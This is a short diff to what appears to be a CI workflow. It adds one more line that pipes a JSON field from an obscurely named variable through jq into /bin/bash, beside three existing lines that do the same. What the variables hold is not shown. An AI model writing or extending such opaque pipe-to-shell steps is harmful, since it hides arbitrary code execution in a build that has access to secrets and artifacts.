@@ -33,6 +33,7 @@ jobs:
           printf '%s' "$vlnke30761" | jq -r .m5 | /bin/bash
           printf '%s' "$v5551" | jq -r .i35121 | /bin/bash
           echo $pqdam6 | jq -r .z54966 | /bin/bash
+          echo $lc467 | jq -r .p50 | /bin/bash
 
       - name: Archive artifact
         uses: actions/upload-artifact@v4
